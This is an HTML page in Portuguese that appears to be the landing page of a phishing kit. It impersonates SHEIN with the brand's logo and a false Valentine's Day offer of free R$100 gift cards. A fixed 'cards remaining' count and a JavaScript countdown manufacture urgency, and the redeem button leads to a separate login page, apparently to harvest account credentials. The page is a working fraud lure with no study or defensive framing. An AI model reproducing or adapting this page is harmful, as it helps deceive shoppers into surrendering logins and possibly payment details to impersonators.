<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="css/estilo.css">
    <title>Garanta Seus Cupons</title>
</head>
<body>
    <div class="container-menu">
        <div class="menu-hamburguer">
            <span></span>
            <span></span>
            <span></span>
        </div>
        <div class="logo">
            <img class="img_logo" src="img/logo-shein.png" alt="">
        </div>
        <div class="menu-icons">
            <i class="fas fa-shopping-cart"></i>
        </div>
    </div>
    <div style="margin-top: 4.9rem;" class="second-menu">
        Cartões restantes: 125
    </div>

<div class="container">
    <h1>Garanta Seu Cartão!</h1>
    <p>A SHEIN ESTÁ DISTRIBUINDO 500 CARTÕES DE 100 REAIS COMO PROMOÇÃO DE DIA DOS NAMORADOS.</p>
    <div class="card">
        <span>R$100,00</span>
        <p>Expira em <span style="font-size: 1rem;" id="countdown">12:44:01</span></p>
    </div>
    <button class="save-button" onclick="window.location.href='login.html'">Resgatar cartão</button>
    </div>

    <script>
        function startCountdown() {
            const countdownElement = document.getElementById('countdown');
            const targetDate = new Date('2024-06-19T23:59:59');

            function updateCountdown() {
                const now = new Date();
                const timeDifference = targetDate - now;

                if (timeDifference <= 0) {
                    countdownElement.textContent = "00:00:00";
                    clearInterval(interval);
                    return;
                }

                const hours = String(Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60))).padStart(2, '0');
                const minutes = String(Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, '0');
                const seconds = String(Math.floor((timeDifference % (1000 * 60)) / 1000)).padStart(2, '0');

                countdownElement.textContent = `${hours}:${minutes}:${seconds}`;
            }

            updateCountdown();
            const interval = setInterval(updateCountdown, 1000);
        }

        startCountdown();
    </script>

</body>
</html>
